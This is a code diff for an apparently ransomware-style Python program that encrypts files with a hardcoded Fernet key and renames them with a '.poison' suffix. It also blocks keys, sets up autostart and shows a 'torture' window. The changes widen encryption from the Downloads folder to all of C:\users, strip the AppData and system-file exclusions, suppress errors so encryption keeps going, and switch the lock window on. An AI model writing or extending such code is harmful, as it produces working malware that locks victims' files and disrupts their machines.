@@ -18,10 +18,10 @@ global filename
 executing = True
 filename = "".join(["\\", __file__.split('\\')[-1].split('.')[0], ".exe"])
 KEY: Final = b'171yM5aII7w0cM2C0EtD9yOlU71d4vooktwHOIsoZ6I='
-DEST_PATH: Final = f"C:\\Users\\{getuser()}\\Downloads"
-DIR_EXCLUSIONS: Final = [".vscode", "AppData", "encrypt.py", ".git", "Searches", ".venv"]
+DEST_PATH: Final = f"C:\\users"
+DIR_EXCLUSIONS: Final = [".vscode", "encrypt.py", ".git", "Searches", ".venv"]
 FILE_SUFFIX: Final = "poison"
-FILE_SUFFIX_EXCLUSIONS: Final = [FILE_SUFFIX, "exe", "DAT", "LOG1", "LOG2", "blf", "regtrans-ms", "gitconfig"]
+FILE_SUFFIX_EXCLUSIONS: Final = [FILE_SUFFIX, "exe", "gitconfig"]
 
 
 class Encryption(threading.Thread):
@@ -65,9 +65,9 @@ class Encryption(threading.Thread):
                 encrypted_content = Fernet(self.KEY).encrypt(content)
                 with open(file, "wb") as binary_file:
                     binary_file.write(encrypted_content)
+                os.rename(file, f"{file}.{self.FILE_SUFFIX}")
             except:
-                print("no permission")
-            os.rename(file, f"{file}.{self.FILE_SUFFIX}")
+                continue
 
             if (self.stop):
                 break
@@ -101,9 +101,9 @@ class Decryption(threading.Thread):
                 decrypted_content = Fernet(self.KEY).decrypt(content)
                 with open(file, "wb") as binary_file:
                     binary_file.write(decrypted_content)
+                os.rename(file, file.replace(f".{self.FILE_SUFFIX}", ""))
             except:
-                print("no permission")
-            os.rename(file, file.replace(f".{self.FILE_SUFFIX}", ""))
+                continue
 
     def run(self):
         self.decryptFiles(self.getEencryptedFiles())
@@ -175,7 +175,7 @@ def stop_torture(event):
         sys.exit()
     elif(read_input_field() == "exit"):
         ec.stopThread()
-        # remove_autostart_dir()
+        remove_autostart_dir()
         window.destroy()
         sys.exit()
 
@@ -226,4 +226,4 @@ threading.Thread(target=block_keys, daemon=True).start()
 
 ec.start()
 
-# window.mainloop()
+window.mainloop()
